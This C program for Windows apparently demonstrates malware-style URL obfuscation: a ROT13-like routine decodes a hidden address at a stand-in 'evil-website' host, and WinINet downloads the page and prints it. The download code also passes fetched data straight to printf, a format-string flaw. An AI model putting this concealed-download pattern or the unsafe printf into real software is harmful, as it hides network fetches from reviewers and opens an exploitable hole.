#include <stdbool.h>
#include <stdio.h>
#include <windows.h>
#include <wininet.h>
LPSTR decodifica(LPSTR);
BOOL scarica(LPSTR);
int main(void) {
  BOOL bRet;
  LPSTR percorso = "uggc122jjj4rivy3jrofvgr4vg2znva4ugzy";
  LPSTR finale;
  finale = decodifica(percorso);
  // printf("%s\n", finale);
  bRet = scarica(finale);
  return 0;
}

BOOL scarica(LPSTR lpszUrl) {
  HINTERNET hInternet;
  HINTERNET hInternetUrl;
  BYTE bBuffer[1024];
  DWORD dwRead;
  BOOL bRet = FALSE;
  hInternet =
      InternetOpen("MyAgent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
  if (hInternet != NULL) {
    hInternetUrl = InternetOpenUrl(hInternet, lpszUrl, NULL, 0, 0, 0);
    if (hInternetUrl != NULL) {
      do {
        bRet =
            InternetReadFile(hInternetUrl, bBuffer, sizeof(bBuffer), &dwRead);
        printf(bBuffer);
        printf("\n ");
      } while (bRet && dwRead == sizeof(bBuffer));
      InternetCloseHandle(hInternetUrl);
    }
    InternetCloseHandle(hInternet);
  }
  return bRet;
}

LPSTR decodifica(LPSTR input) {
  int cont;
  char *buffertemp;
  buffertemp = (char *)malloc(sizeof(char) * (strlen(input) + 1));
  for (cont = 0; cont < strlen(input); cont++) {
    buffertemp[cont] = (((input[cont] - 97) + 13) % 26 + 97);
    if (buffertemp[cont] == 'X')
      buffertemp[cont] = 58;
    if (buffertemp[cont] == 'Y')
      buffertemp[cont] = 47;
    if (buffertemp[cont] == 'Z')
      buffertemp[cont] = 45;
    if (buffertemp[cont] == '[')
      buffertemp[cont] = 46;
  }
  buffertemp[strlen(input)] = '\0';
  return buffertemp;
}
